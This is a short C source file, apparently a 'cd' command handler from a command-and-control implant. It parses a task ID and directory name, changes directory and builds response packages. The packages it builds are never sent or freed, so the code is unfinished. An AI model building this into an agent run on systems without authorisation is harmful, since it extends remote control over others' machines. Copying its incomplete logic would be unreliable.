#include "WrapCd.h"
#include "BaseCd.h"
#include <string>

BOOL wrapCd(PParser arguments)
{

    SIZE_T uuidLength = 36;
	PCHAR taskUuid = getString(arguments, &uuidLength);
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
    PCHAR newDir = getString(arguments, &size);
	newDir = (PCHAR)LocalReAlloc(newDir, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);

	PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
	addString(responseTask, taskUuid, FALSE);

    // Temporary output to store the result
	PPackage output = newPackage(0, FALSE);
    // Check if the directory exists before changing
    BOOL success = baseCd(newDir);
    if (!success)
    {
        char result[256];
        snprintf(result, sizeof(result), "[CD] Error changing directory to %s !\n", newDir);
        addString(output, result, FALSE);
        return FALSE;
    }

    addString(output, newDir, FALSE);

    return TRUE;
}